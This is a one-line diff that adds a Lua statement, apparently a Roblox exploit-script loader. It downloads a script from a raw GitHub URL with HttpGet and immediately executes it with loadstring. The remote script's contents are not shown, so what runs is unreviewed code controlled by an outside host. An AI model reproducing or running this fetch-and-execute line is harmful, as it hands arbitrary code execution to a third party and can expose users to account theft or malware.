@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/Universal/refs/heads/main/Ok_260618_235312.lua.txt", true))()
